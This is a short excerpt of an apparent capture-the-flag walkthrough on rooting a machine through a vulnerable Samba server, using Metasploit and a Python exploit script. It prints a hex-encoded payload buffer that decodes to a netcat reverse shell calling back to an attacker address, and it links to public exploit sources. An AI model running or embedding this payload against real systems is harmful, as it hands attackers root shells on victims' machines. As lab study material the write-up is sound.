...
To root this machine we will use Metasploit to exploit a vulnerable version of Unix Samba Server.  This particular exploit obtains root privileges instantly.
After using Metasploit, we will also find a python script which exploits the Samba Server, and run it for manual exploitation.
...
samba-exploit.py:
    ...
    buf += b"\x64\x67\x68\x72\x6c\x79\x3b\x20\x6e\x63\x20\x31\x30"
    buf += b"\x2e\x31\x30\x2e\x31\x34\x2e\x32\x34\x20\x39\x39\x39"
    buf += b"\x37\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x6d\x64\x67\x68"
    buf += b"\x72\x6c\x79\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68"
    buf += b"\x20\x3e\x2f\x74\x6d\x70\x2f\x6d\x64\x67\x68\x72\x6c"
    buf += b"\x79\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74"
    buf += b"\x6d\x70\x2f\x6d\x64\x67\x68\x72\x6c\x79"
...
1. Rapid7 website for Metasploit module: [https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)
2. Exploit-db entry: [https://www.exploit-db.com/exploits/16320](https://www.exploit-db.com/exploits/16320)
3. Python-based exploit script: [https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)
